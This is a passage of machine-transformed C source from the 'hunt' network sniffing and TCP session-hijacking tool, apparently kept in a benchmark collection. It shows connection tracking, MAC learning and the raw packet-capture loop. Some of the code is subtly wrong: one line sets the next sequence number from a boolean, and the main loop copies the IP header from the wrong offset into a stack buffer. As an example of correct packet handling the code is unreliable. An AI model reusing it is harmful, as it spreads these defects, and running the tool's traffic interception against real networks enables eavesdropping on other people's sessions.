    ci->dst_port = tcph->__annonCompField3.__annonCompField2.dest;
#line 330
    h_src = & ci->src;
#line 331
    h_dst = & ci->dst;
  }
  {
#line 333
  tmp___4 = ntohl(tcph->__annonCompField3.__annonCompField2.seq);
  }
#line 333
  if ((tmp___4 + (uint32_t )p->p_data_len) + (uint32_t )tcph->__annonCompField3.__annonCompField2.syn) {
#line 333
    tmp___3 = 1;
  } else {
#line 333
    tmp___3 = 0;
  }
  {
#line 333
  tmp___5 = htonl((uint32_t )tmp___3);
#line 333
  h_src->next_seq = (unsigned long )tmp___5;
  }
#line 335
  if (tcph->__annonCompField3.__annonCompField2.ack) {
#line 336
    h_src->next_d_seq = (unsigned long )tcph->__annonCompField3.__annonCompField2.ack_seq;
  }
  {
#line 337
  h_src->window = tcph->__annonCompField3.__annonCompField2.window;
#line 338
  h_src->id = iph->id;
#line 339
  memcpy((void */* __restrict  */)(h_src->dst_mac), (void const   */* __restrict  */)((p->p_ethh)->h_dest),
         (size_t )6);
#line 340
  memcpy((void */* __restrict  */)(h_src->src_mac), (void const   */* __restrict  */)((p->p_ethh)->h_source),
         (size_t )6);
#line 343
  h_dst->next_seq = h_src->next_d_seq;
#line 344
  h_dst->next_d_seq = h_src->next_seq;
#line 345
  h_dst->window = tcph->__annonCompField3.__annonCompField2.window;
#line 346
  h_dst->id = iph->id;
#line 347
  memcpy((void */* __restrict  */)(h_dst->dst_mac), (void const   */* __restrict  */)(h_src->src_mac),
         (size_t )6);
#line 348
  memcpy((void */* __restrict  */)(h_dst->src_mac), (void const   */* __restrict  */)(h_src->dst_mac),
         (size_t )6);
#line 350
  hash_put(& conn_table, key, (void *)ci);
#line 352
  print_new_conn_ind(1);
  }
#line 353
  return;
}
}
#line 355 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void ack_storm_notify(struct conn_info *ci , struct user_conn_info *uci ) 
{ 
  struct timeval tv ;
  int print_it ;

  {
#line 358
  print_it = 0;
#line 360
  if (! ci->ack_storm_notify_sec) {
    {
#line 361
    gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
#line 362
    print_it = 1;
    }
  } else {
    {
#line 364
    gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
    }
#line 365
    if (tv.tv_sec - (__time_t )ci->ack_storm_notify_sec >= 10L) {
#line 366
      print_it = 1;
    }
  }
#line 368
  if (print_it) {
    {
#line 369
    set_tty_color((enum TTY_COLOR )9);
#line 370
    printf((char const   */* __restrict  */)"\nhunt: possible ACK storm: ");
#line 371
    print_user_conn_info(uci, 1);
#line 372
    set_tty_color((enum TTY_COLOR )7);
#line 373
    ci->ack_storm_notify_sec = (unsigned int )tv.tv_sec;
    }
  }
#line 375
  return;
}
}
#line 379
static void conn_add_update(struct packet *p ) ;
#line 379 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static struct user_conn_info last_toadd  =    {0UL, 0UL, (unsigned short)0, (unsigned short)0};
#line 380 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static int last_count  =    0;
#line 377 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void conn_add_update(struct packet *p ) 
{ 
  unsigned int key ;
  struct conn_info *ci ;
  struct user_conn_info uci ;
  unsigned int old_next_d_seq ;
  struct host_info *h_src ;
  struct host_info *h_dst ;
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;
  int tmp___5 ;
  void *tmp___6 ;
  int tmp___7 ;

  {
  {
#line 386
  fill_uci(& uci, p);
#line 387
  key = uci_generate_key(& uci);
#line 389
  hash_lock(& conn_table);
#line 390
  tmp___6 = hash_get(& conn_table, key, (void *)(& uci));
#line 390
  ci = (struct conn_info *)tmp___6;
  }
#line 390
  if (ci) {
    {
#line 390
    tmp___7 = ht_eq(key, ci, & uci);
    }
#line 390
    if (tmp___7 == 1) {
      {
#line 392
      tmp___3 = conn_skip_update(ci, p);
      }
#line 392
      if (! tmp___3) {
#line 394
        iph = p->p_iph;
#line 395
        tcph = p->p_hdr.p_tcph;
#line 397
        if (ci->src_addr == (unsigned long )iph->saddr) {
#line 397
          if (ci->dst_addr == (unsigned long )iph->daddr) {
#line 397
            if ((int )ci->src_port == (int )tcph->__annonCompField3.__annonCompField2.source) {
#line 397
              if ((int )ci->dst_port == (int )tcph->__annonCompField3.__annonCompField2.dest) {
#line 401
                h_src = & ci->src;
#line 402
                h_dst = & ci->dst;
              } else {
#line 404
                h_src = & ci->dst;
#line 405
                h_dst = & ci->src;
              }
            } else {
#line 404
              h_src = & ci->dst;
#line 405
              h_dst = & ci->src;
            }
          } else {
#line 404
            h_src = & ci->dst;
#line 405
            h_dst = & ci->src;
          }
        } else {
#line 404
          h_src = & ci->dst;
#line 405
          h_dst = & ci->src;
        }
        {
#line 407
        old_next_d_seq = (unsigned int )h_src->next_d_seq;
#line 409
        tmp = ntohl(tcph->__annonCompField3.__annonCompField2.seq);
#line 409
        tmp___0 = htonl(tmp + (uint32_t )p->p_data_len);
#line 409
        h_src->next_seq = (unsigned long )tmp___0;
        }
#line 411
        if (tcph->__annonCompField3.__annonCompField2.ack) {
#line 412
          h_src->next_d_seq = (unsigned long )tcph->__annonCompField3.__annonCompField2.ack_seq;
        }
        {
#line 413
        h_src->id = iph->id;
#line 414
        h_src->window = tcph->__annonCompField3.__annonCompField2.window;
#line 416
        memcpy((void */* __restrict  */)(h_src->dst_mac), (void const   */* __restrict  */)((p->p_ethh)->h_dest),
               (size_t )6);
#line 417
        memcpy((void */* __restrict  */)(h_src->src_mac), (void const   */* __restrict  */)((p->p_ethh)->h_source),
               (size_t )6);
#line 421
        tmp___1 = ntohl((uint32_t )h_src->next_d_seq);
#line 421
        tmp___2 = ntohl(old_next_d_seq);
#line 421
        h_src->delta_d_seq += tmp___1 - tmp___2;
#line 423
        (ci->update_count) ++;
        }
#line 423
        if (ci->update_count % 400U == 0U) {
#line 424
          if (ci->src.delta_d_seq == 0U) {
#line 424
            if (ci->dst.delta_d_seq == 0U) {
              {
#line 426
              ack_storm_notify(ci, & uci);
              }
            } else {
#line 428
              ci->src.delta_d_seq = 0U;
#line 429
              ci->dst.delta_d_seq = 0U;
            }
          } else {
#line 428
            ci->src.delta_d_seq = 0U;
#line 429
            ci->dst.delta_d_seq = 0U;
          }
        }
      }
    } else {
#line 390
      goto _L___3;
    }
  } else
  _L___3: /* CIL Label */ 
#line 435
  if (p->p_data_len > 0) {
    {
#line 439
    tmp___4 = conn_add_policy(p->p_iph, p->p_hdr.p_tcph);
    }
#line 439
    if (tmp___4) {
      {
#line 440
      __conn_add(p, key);
      }
    }
  } else
#line 446
  if (last_toadd.src_addr == (unsigned long )(p->p_iph)->saddr) {
#line 446
    if (last_toadd.dst_addr == (unsigned long )(p->p_iph)->daddr) {
#line 446
      if ((int )last_toadd.src_port == (int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source) {
#line 446
        if ((int )last_toadd.dst_port == (int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest) {
#line 446
          goto _L;
        } else {
#line 446
          goto _L___2;
        }
      } else {
#line 446
        goto _L___2;
      }
    } else {
#line 446
      goto _L___2;
    }
  } else
  _L___2: /* CIL Label */ 
#line 446
  if (last_toadd.src_addr == (unsigned long )(p->p_iph)->daddr) {
#line 446
    if (last_toadd.dst_addr == (unsigned long )(p->p_iph)->saddr) {
#line 446
      if ((int )last_toadd.src_port == (int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest) {
#line 446
        if ((int )last_toadd.dst_port == (int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source) {
          _L: /* CIL Label */ 
#line 454
          last_count ++;
#line 454
          if (last_count >= 10) {
            {
#line 455
            last_count = 0;
#line 456
            tmp___5 = conn_add_policy(p->p_iph, p->p_hdr.p_tcph);
            }
#line 456
            if (tmp___5) {
              {
#line 457
              __conn_add(p, key);
              }
            }
          }
        } else {
#line 460
          last_count = 0;
#line 461
          last_toadd.src_addr = (unsigned long )(p->p_iph)->saddr;
#line 462
          last_toadd.dst_addr = (unsigned long )(p->p_iph)->daddr;
#line 463
          last_toadd.src_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source;
#line 464
          last_toadd.dst_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest;
        }
      } else {
#line 460
        last_count = 0;
#line 461
        last_toadd.src_addr = (unsigned long )(p->p_iph)->saddr;
#line 462
        last_toadd.dst_addr = (unsigned long )(p->p_iph)->daddr;
#line 463
        last_toadd.src_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source;
#line 464
        last_toadd.dst_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest;
      }
    } else {
#line 460
      last_count = 0;
#line 461
      last_toadd.src_addr = (unsigned long )(p->p_iph)->saddr;
#line 462
      last_toadd.dst_addr = (unsigned long )(p->p_iph)->daddr;
#line 463
      last_toadd.src_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source;
#line 464
      last_toadd.dst_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest;
    }
  } else {
#line 460
    last_count = 0;
#line 461
    last_toadd.src_addr = (unsigned long )(p->p_iph)->saddr;
#line 462
    last_toadd.dst_addr = (unsigned long )(p->p_iph)->daddr;
#line 463
    last_toadd.src_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source;
#line 464
    last_toadd.dst_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest;
  }
  {
#line 468
  hash_unlock(& conn_table);
  }
#line 469
  return;
}
}
#line 471 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void conn_del(struct packet *p ) 
{ 
  struct conn_info *ci ;
  struct user_conn_info uci ;
  unsigned int key ;
  int remove_it ;
  int tmp ;
  void *tmp___0 ;
  int tmp___1 ;
  void *tmp___2 ;

  {
  {
#line 476
  remove_it = 0;
#line 484
  fill_uci(& uci, p);
#line 485
  key = uci_generate_key(& uci);
#line 486
  hash_lock(& conn_table);
#line 487
  tmp___0 = hash_get(& conn_table, key, (void *)(& uci));
#line 487
  ci = (struct conn_info *)tmp___0;
  }
#line 487
  if (ci) {
    {
#line 487
    tmp___1 = ht_eq(key, ci, & uci);
    }
#line 487
    if (tmp___1 == 1) {
      {
#line 489
      tmp = conn_skip_update(ci, p);
      }
#line 489
      if (! tmp) {
#line 490
        if ((unsigned long )(p->p_iph)->saddr == ci->src_addr) {
#line 490
          if ((unsigned long )(p->p_iph)->daddr == ci->dst_addr) {
#line 490
            if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )ci->src_port) {
#line 490
              if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )ci->dst_port) {
#line 495
                if ((unsigned long )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.seq == ci->dst.next_d_seq) {
#line 496
                  remove_it = 1;
                }
              } else {
#line 490
                goto _L___1;
              }
            } else {
#line 490
              goto _L___1;
            }
          } else {
#line 490
            goto _L___1;
          }
        } else
        _L___1: /* CIL Label */ 
#line 499
        if ((unsigned long )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.seq == ci->src.next_d_seq) {
#line 500
          remove_it = 1;
        }
      }
    }
  }
#line 504
  if (remove_it) {
    {
#line 505
    tmp___2 = hash_remove(& conn_table, key, (void *)(& uci));
    }
#line 505
    if ((unsigned long )ci == (unsigned long )tmp___2) {
      {
#line 506
      conn_free(ci);
      }
    }
    {
#line 507
    hash_unlock(& conn_table);
    }
  } else {
    {
#line 509
    hash_unlock(& conn_table);
#line 510
    conn_add_update(p);
    }
  }
#line 512
  return;
}
}
#line 514 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void conn_add(struct packet *p ) 
{ 
  struct conn_info *ci ;
  struct user_conn_info uci ;
  unsigned int key ;
  void *tmp ;
  int tmp___0 ;

  {
  {
#line 520
  fill_uci(& uci, p);
#line 521
  key = uci_generate_key(& uci);
#line 522
  hash_lock(& conn_table);
#line 523
  tmp = hash_get(& conn_table, key, (void *)(& uci));
#line 523
  ci = (struct conn_info *)tmp;
  }
#line 523
  if (ci) {
    {
#line 523
    tmp___0 = ht_eq(key, ci, & uci);
    }
#line 523
    if (tmp___0 == 1) {
      {
#line 525
      conn_add_update(p);
      }
    } else {
      {
#line 533
      __conn_add(p, key);
      }
    }
  } else {
    {
#line 533
    __conn_add(p, key);
    }
  }
  {
#line 535
  hash_unlock(& conn_table);
  }
#line 536
  return;
}
}
#line 538 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void conn_update_table(struct packet *p , struct ethhdr *ethh , struct iphdr *iph ) 
{ 
  struct tcphdr *tcph ;
  int tmp ;

  {
#line 540
  tcph = p->p_hdr.p_tcph;
#line 542
  if (tcph->__annonCompField3.__annonCompField2.syn) {
#line 542
    if (! tcph->__annonCompField3.__annonCompField2.ack) {
      {
#line 543
      tmp = conn_add_policy(iph, tcph);
      }
#line 543
      if (tmp) {
        {
#line 544
        conn_add(p);
        }
      }
    } else {
#line 542
      goto _L;
    }
  } else
  _L: /* CIL Label */ 
#line 546
  if (tcph->__annonCompField3.__annonCompField2.rst) {
    {
#line 550
    conn_del(p);
    }
  } else
#line 546
  if (tcph->__annonCompField3.__annonCompField2.fin) {
    {
#line 550
    conn_del(p);
    }
  } else {
    {
#line 555
    conn_add_update(p);
    }
  }
#line 557
  return;
}
}
#line 564 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void process_tcp(struct packet *p ) 
{ 
  struct ifunc_item *li ;
  struct list_iterator iter ;
  void *tmp ;

  {
  {
#line 569
  list_iter_set(& iter, & l_ifunc_tcp);
  }
  {
#line 570
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 570
    tmp = list_iter_get(& iter);
#line 570
    li = (struct ifunc_item *)tmp;
    }
#line 570
    if (! li) {
#line 570
      goto while_break;
    }
    {
#line 571
    (*(li->func))(p, li->arg);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 572
  list_iter_end(& iter);
  }
#line 573
  return;
}
}
#line 575 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void process_udp(struct packet *p ) 
{ 
  struct ifunc_item *li ;
  struct list_iterator iter ;
  void *tmp ;

  {
  {
#line 580
  list_iter_set(& iter, & l_ifunc_udp);
  }
  {
#line 581
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 581
    tmp = list_iter_get(& iter);
#line 581
    li = (struct ifunc_item *)tmp;
    }
#line 581
    if (! li) {
#line 581
      goto while_break;
    }
    {
#line 582
    (*(li->func))(p, li->arg);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 583
  list_iter_end(& iter);
  }
#line 584
  return;
}
}
#line 586 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void process_icmp(struct packet *p ) 
{ 
  struct ifunc_item *li ;
  struct list_iterator iter ;
  void *tmp ;

  {
  {
#line 591
  list_iter_set(& iter, & l_ifunc_icmp);
  }
  {
#line 592
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 592
    tmp = list_iter_get(& iter);
#line 592
    li = (struct ifunc_item *)tmp;
    }
#line 592
    if (! li) {
#line 592
      goto while_break;
    }
    {
#line 593
    (*(li->func))(p, li->arg);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 594
  list_iter_end(& iter);
  }
#line 595
  return;
}
}
#line 597 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void process_arp(struct packet *p ) 
{ 
  struct ifunc_item *li ;
  struct list_iterator iter ;
  void *tmp ;

  {
  {
#line 602
  list_iter_set(& iter, & l_ifunc_arp);
  }
  {
#line 603
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 603
    tmp = list_iter_get(& iter);
#line 603
    li = (struct ifunc_item *)tmp;
    }
#line 603
    if (! li) {
#line 603
      goto while_break;
    }
    {
#line 604
    (*(li->func))(p, li->arg);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 605
  list_iter_end(& iter);
  }
#line 606
  return;
}
}
#line 608 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void process_ip(struct packet *p ) 
{ 
  struct ifunc_item *li ;
  struct list_iterator iter ;
  void *tmp ;

  {
  {
#line 613
  list_iter_set(& iter, & l_ifunc_ip);
  }
  {
#line 614
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 614
    tmp = list_iter_get(& iter);
#line 614
    li = (struct ifunc_item *)tmp;
    }
#line 614
    if (! li) {
#line 614
      goto while_break;
    }
    {
#line 615
    (*(li->func))(p, li->arg);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 616
  list_iter_end(& iter);
  }
#line 617
  return;
}
}
#line 634 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
__inline static void fast_tcp_process(struct packet *p ) 
{ 
  struct list_iterator iter ;
  struct ifunc_item *li ;
  void *tmp ;

  {
  {
#line 639
  list_lock(& l_ifunc_fast_tcp);
#line 640
  list_iter_set(& iter, & l_ifunc_fast_tcp);
  }
  {
#line 641
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 641
    tmp = list_iter_get(& iter);
#line 641
    li = (struct ifunc_item *)tmp;
    }
#line 641
    if (! li) {
#line 641
      goto while_break;
    }
    {
#line 642
    (*(li->func))(p, li->arg);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 643
  list_iter_end(& iter);
#line 644
  list_unlock(& l_ifunc_fast_tcp);
  }
#line 645
  return;
}
}
#line 647 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void mac_table_update(unsigned int ip , char *mac ) 
{ 
  struct mac_info *mi ;
  int tmp ;
  void *tmp___0 ;
  void *tmp___1 ;

  {
  {
#line 651
  hash_lock(& mac_table);
#line 652
  tmp___1 = hash_get(& mac_table, ip, (void *)0);
#line 652
  mi = (struct mac_info *)tmp___1;
  }
#line 652
  if (mi) {
    {
#line 653
    tmp = memcmp((void const   *)(mi->mac), (void const   *)mac, sizeof(mi->mac));
    }
#line 653
    if (tmp) {
      {
#line 654
      pthread_mutex_lock(& mi->mutex);
#line 655
      memcpy((void */* __restrict  */)(mi->mac), (void const   */* __restrict  */)mac,
             sizeof(mi->mac));
#line 656
      pthread_mutex_unlock(& mi->mutex);
      }
    }
  } else {
    {
#line 659
    tmp___0 = malloc(sizeof(struct mac_info ));
#line 659
    mi = (struct mac_info *)tmp___0;
    }
#line 660
    if (! mi) {
      {
#line 660
      __assert_fail("mi", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c",
                    660U, "mac_table_update");
      }
    }
    {
#line 661
    memcpy((void */* __restrict  */)(mi->mac), (void const   */* __restrict  */)mac,
           sizeof(mi->mac));
#line 662
    pthread_mutex_init(& mi->mutex, (pthread_mutexattr_t const   *)((void *)0));
#line 663
    hash_put(& mac_table, ip, (void *)mi);
    }
  }
  {
#line 665
  hash_unlock(& mac_table);
  }
#line 666
  return;
}
}
#line 668 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct mac_info *mac_info_get(unsigned int ip ) 
{ 
  struct mac_info *mi ;
  void *tmp ;

  {
  {
#line 672
  hash_lock(& mac_table);
#line 673
  tmp = hash_get(& mac_table, ip, (void *)0);
#line 673
  mi = (struct mac_info *)tmp;
  }
#line 673
  if (mi) {
    {
#line 674
    pthread_mutex_lock(& mi->mutex);
    }
  }
  {
#line 676
  hash_unlock(& mac_table);
  }
#line 677
  return (mi);
}
}
#line 680 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void mac_info_release(struct mac_info *mi ) 
{ 


  {
  {
#line 682
  pthread_mutex_unlock(& mi->mutex);
  }
#line 683
  return;
}
}
#line 685 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void mac_arp_learn(struct packet *p ) 
{ 
  unsigned int ip ;
  char *mac ;
  struct arpeth_hdr *arpethh ;
  char *tmp ;
  int tmp___0 ;
  uint16_t tmp___1 ;
  uint16_t tmp___2 ;

  {
  {
#line 691
  arpethh = (struct arpeth_hdr *)(p->p_arph + 1);
#line 693
  tmp___1 = htons((uint16_t )2);
  }
#line 693
  if ((int )(p->p_arph)->ar_op == (int )tmp___1) {
#line 693
    goto _L;
  } else {
    {
#line 693
    tmp___2 = htons((uint16_t )1);
    }
#line 693
    if ((int )(p->p_arph)->ar_op == (int )tmp___2) {
      _L: /* CIL Label */ 
      {
#line 695
      ip = *((unsigned int *)(arpethh->ar_sip));
#line 696
      mac = (char *)(arpethh->ar_sha);
#line 697
      tmp___0 = memcmp((void const   *)mac, (void const   *)((p->p_ethh)->h_source),
                       (size_t )6);
      }
#line 697
      if (tmp___0 == 0) {
        {
#line 698
        mac_table_update(ip, mac);
        }
      } else {
        {
#line 700
        tmp = host_lookup(ip, hl_mode);
#line 700
        fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"ARP: MAC src != ARP src for host %s\n",
                tmp);
        }
      }
    }
  }
#line 702
  return;
}
}
#line 704 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void mac_ip_learn(struct packet *p ) 
{ 
  unsigned int ip ;
  char *mac ;

  {
  {
#line 709
  ip = (p->p_iph)->saddr;
#line 710
  mac = (char *)((p->p_ethh)->h_source);
#line 711
  mac_table_update(ip, mac);
  }
#line 716
  return;
}
}
#line 723 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
unsigned int pkts_received  =    0U;
#line 724 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
unsigned int pkts_dropped  =    0U;
#line 725 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
unsigned int pkts_unhandled  =    0U;
#line 726 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
unsigned int bytes_received  =    0U;
#line 728 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void *hunt(void *arg ) 
{ 
  int i ;
  char buff[1024] ;
  struct packet *p ;
  struct ethhdr *ethh ;
  struct iphdr *iph ;
  __pid_t tmp ;
  int tmp___0 ;
  int tmp___1 ;
  __pid_t tmp___2 ;
  uint16_t tmp___3 ;
  uint16_t tmp___4 ;
  uint16_t tmp___5 ;
  uint16_t tmp___6 ;
  uint16_t tmp___7 ;
  uint16_t tmp___8 ;
  unsigned short tmp___9 ;
  uint16_t tmp___10 ;
  unsigned short tmp___11 ;
  unsigned short tmp___12 ;
  int tmp___13 ;
  ssize_t tmp___14 ;

  {
  {
#line 740
  pthread_sigmask(0, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
  }
#line 742
  if (verbose) {
    {
#line 743
    tmp = getpid();
#line 743
    printf((char const   */* __restrict  */)"hunt pid %d\n", tmp);
    }
  }
  {
#line 744
  add_telnet_rlogin_policy();
#line 745
  tmp___0 = hash_init(& conn_table, 100, (int (*)(unsigned int key , void *data_ht ,
                                                  void *arg ))(& ht_eq));
  }
#line 745
  if (tmp___0) {
    {
#line 746
    perror("hash_init");
#line 747
    exit(1);
    }
  }
  {
#line 749
  tmp___1 = hash_init(& mac_table, 100, (int (*)(unsigned int key , void *data_ht ,
                                                 void *arg ))((void *)0));
  }
#line 749
  if (tmp___1) {
    {
#line 750
    perror("hash init");
#line 751
    exit(1);
    }
  }
  {
#line 753
  linksock = tap(eth_device, 1);
  }
#line 754
  if (linksock < 0) {
    {
#line 755
    perror("linksock");
#line 756
    exit(1);
    }
  }
  {
#line 758
  packet_preallocate(64);
#line 760
  printf((char const   */* __restrict  */)"starting hunt\n");
#line 761
  tmp___2 = getpid();
#line 761
  setpriority(0, (id_t )tmp___2, -20);
#line 762
  pthread_mutex_lock(& mutex_hunt_ready);
#line 763
  hunt_ready = 1;
#line 764
  pthread_cond_signal(& cond_hunt_ready);
#line 765
  pthread_mutex_unlock(& mutex_hunt_ready);
  }
  {
#line 766
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 767
    p = packet_new();
    }
#line 767
    if (! p) {
      {
#line 768
      fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"can\'t get free packet - out of memory\n");
#line 769
      exit(1);
      }
    }
    {
#line 781
    tmp___14 = recv(linksock, (void *)(p->p_raw), sizeof(p->p_raw), 0);
#line 781
    tmp___13 = (int )tmp___14;
#line 781
    p->p_raw_len = tmp___13;
    }
#line 781
    if (tmp___13 > 0) {
#line 784
      pkts_received ++;
#line 785
      bytes_received += (unsigned int )p->p_raw_len;
#line 789
      if (p->p_raw_len < 14) {
#line 790
        pkts_dropped ++;
#line 791
        goto cont;
      }
      {
#line 793
      ethh = (struct ethhdr *)(p->p_raw);
#line 794
      p->p_ethh = ethh;
#line 799
      p->p_timestamp = (time_t )0;
#line 800
      tmp___3 = ntohs(ethh->h_proto);
      }
      {
#line 801
      if ((int )tmp___3 == 2048) {
#line 801
        goto case_2048;
      }
#line 874
      if ((int )tmp___3 == 2054) {
#line 874
        goto case_2054;
      }
#line 887
      goto switch_default___0;
      case_2048: /* CIL Label */ 
      {
#line 802
      p->p_timestamp = time((time_t *)((void *)0));
      }
#line 803
      if (p->p_raw_len < 34) {
#line 804
        pkts_dropped ++;
#line 805
        goto cont;
      }
#line 807
      iph = (struct iphdr *)((char *)ethh + sizeof(struct ethhdr ));
#line 808
      i = 0;
      {
#line 808
      while (1) {
        while_continue___0: /* CIL Label */ ;
#line 808
        if (! ((unsigned long )i < sizeof(struct iphdr ))) {
#line 808
          goto while_break___0;
        }
#line 809
        buff[i] = p->p_raw[sizeof(struct iphdr ) + (unsigned long )i];
#line 808
        i ++;
      }
      while_break___0: /* CIL Label */ ;
      }
      {
#line 810
      iph = (struct iphdr *)((void *)(buff));
#line 811
      p->p_iph = iph;
#line 812
      tmp___12 = in_cksum((unsigned short *)iph, (int )(iph->ihl << 2));
      }
#line 812
      if ((int )tmp___12 == 0) {
#line 814
        if (mac_learn_from_ip) {
          {
#line 815
          mac_ip_learn(p);
          }
        }
        {
#line 816
        process_ip(p);
#line 818
        tmp___4 = ntohs(iph->frag_off);
        }
#line 818
        if (((int )tmp___4 & 8191) != 0) {
#line 821
          pkts_dropped ++;
#line 822
          goto cont;
        } else {
          {
#line 818
          tmp___5 = ntohs(iph->frag_off);
          }
#line 818
          if ((int )tmp___5 & 8192) {
#line 821
            pkts_dropped ++;
#line 822
            goto cont;
          } else {
            {
#line 818
            tmp___6 = ntohs(iph->tot_len);
            }
#line 818
            if ((iph->ihl << 2) + ((unsigned int )tmp___6 - (iph->ihl << 2)) > (unsigned int )p->p_raw_len) {
#line 821
              pkts_dropped ++;
#line 822
              goto cont;
            }
          }
        }
        {
#line 825
        if ((int )iph->protocol == 6) {
#line 825
          goto case_6;
        }
#line 842
        if ((int )iph->protocol == 17) {
#line 842
          goto case_17;
        }
#line 853
        if ((int )iph->protocol == 1) {
#line 853
          goto case_1;
        }
#line 867
        goto switch_default;
        case_6: /* CIL Label */ 
#line 826
        if ((unsigned int )p->p_raw_len < (14U + (iph->ihl << 2)) + 20U) {
#line 827
          pkts_dropped ++;
#line 828
          goto cont;
        }
        {
#line 830
        p->p_type = (enum PACKET_TYPE )1;
#line 831
        p->p_hdr.p_tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
#line 831
        p->p_data = (char *)p->p_hdr.p_tcph + ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.doff << 2);
#line 833
        tmp___7 = ntohs(iph->tot_len);
#line 833
        p->p_data_len = (int )(((unsigned int )tmp___7 - (iph->ihl << 2)) - (unsigned int )((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.doff << 2));
#line 834
        tmp___8 = ntohs(iph->tot_len);
#line 834
        tmp___9 = ip_in_cksum(iph, (unsigned short *)p->p_hdr.p_tcph, (int )((unsigned int )tmp___8 - (iph->ihl << 2)));
        }
#line 834
        if ((int )tmp___9 == 0) {
          {
#line 836
          conn_update_table(p, ethh, iph);
#line 837
          fast_tcp_process(p);
#line 838
          process_tcp(p);
          }
        } else {
#line 840
          pkts_dropped ++;
        }
#line 841
        goto switch_break___0;
        case_17: /* CIL Label */ 
#line 843
        if ((unsigned int )p->p_raw_len < (14U + (iph->ihl << 2)) + 8U) {
#line 844
          pkts_dropped ++;
#line 845
          goto cont;
        }
        {
#line 847
        p->p_type = (enum PACKET_TYPE )2;
#line 848
        p->p_hdr.p_udph = (struct udphdr *)((char *)iph + (iph->ihl << 2));
#line 848
        p->p_data = (char *)p->p_hdr.p_udph + sizeof(struct udphdr );
#line 851
        process_udp(p);
        }
#line 852
        goto switch_break___0;
        case_1: /* CIL Label */ 
#line 854
        if ((unsigned int )p->p_raw_len < (14U + (iph->ihl << 2)) + 8U) {
#line 855
          pkts_dropped ++;
#line 856
          goto cont;
        }
        {
#line 858
        p->p_type = (enum PACKET_TYPE )3;
#line 859
        p->p_hdr.p_icmph = (struct icmphdr *)((char *)iph + (iph->ihl << 2));
#line 859
        p->p_data = (char *)p->p_hdr.p_icmph + sizeof(struct icmphdr );
#line 861
        tmp___10 = ntohs(iph->tot_len);
#line 861
        tmp___11 = in_cksum((unsigned short *)p->p_hdr.p_icmph, (int )((unsigned int )tmp___10 - (iph->ihl << 2)));
        }
#line 861
        if ((int )tmp___11 == 0) {
          {
#line 863
          process_icmp(p);
          }
